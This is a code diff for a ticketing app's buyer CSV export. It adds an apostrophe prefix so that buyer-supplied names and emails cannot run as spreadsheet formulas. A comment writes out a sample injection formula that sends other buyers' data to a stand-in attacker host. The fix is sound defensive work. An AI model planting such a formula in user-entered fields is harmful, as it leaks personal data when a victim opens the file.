@@ -4,12 +4,32 @@ import { requireOrganizerApi, requireOwnedEvent } from '../../../../auth';
 export const dynamic = 'force-dynamic';
 
 /**
+ * A leading one of these makes Excel, Google Sheets and LibreOffice read the
+ * cell as a FORMULA rather than as text.
+ *
+ * Two of the columns in this file — the buyer's name and email — are typed by
+ * an anonymous stranger at checkout, and the file is opened by the organizer on
+ * their own machine. A buyer who books a ticket under the name
+ * `=IMPORTXML(CONCAT("https://attacker.example/?x",A2),"//a")` is writing a
+ * program that runs when the organizer double-clicks the export, with the rest
+ * of the sheet — every other buyer's name and email — available to send
+ * outward. Quoting alone does not stop it: a quoted cell is still parsed as a
+ * formula once the quotes are stripped.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/**
  * One CSV cell. Anything containing a quote, comma, or newline has to be quoted
  * and its quotes doubled, or a buyer called `Shrestha, Ram` silently becomes two
  * columns and shifts every field after it.
+ *
+ * A value that would start a formula is prefixed with an apostrophe, which is
+ * the convention every spreadsheet understands as "this is text": it is not
+ * shown in the cell, and the name still reads normally to the organizer.
  */
 function cell(value: string | number | null | undefined): string {
-  const text = value === null || value === undefined ? '' : String(value);
+  let text = value === null || value === undefined ? '' : String(value);
+  if (FORMULA_LEAD.test(text)) text = `'${text}`;
   return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
 }
 
